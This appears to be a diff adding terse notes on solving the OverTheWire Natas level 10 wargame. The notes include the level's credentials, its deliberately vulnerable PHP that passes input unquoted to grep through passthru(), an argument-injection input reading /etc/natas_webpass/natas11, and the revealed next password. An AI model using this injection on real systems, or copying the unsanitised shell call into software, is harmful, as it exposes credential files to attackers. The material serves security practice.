@@ -1,0 +1,33 @@
+Username : natas10
+Password : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 
+URL      : http://natas10.natas.labs.overthewire.org/
+
+View source, read code :
+
+
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+        $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+   if(preg_match('/[;|&]/',$key)) {
+       print "Input contains an illegal character!";
+   } else {
+       passthru("grep -i $key dictionary.txt");
+   }
+}
+?>
+
+bit trickier:
+
+can inject the filename to look into 
+'d /etc/natas_webpass/natas11 '
+
+win 
+
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK 
+no a or e lel 
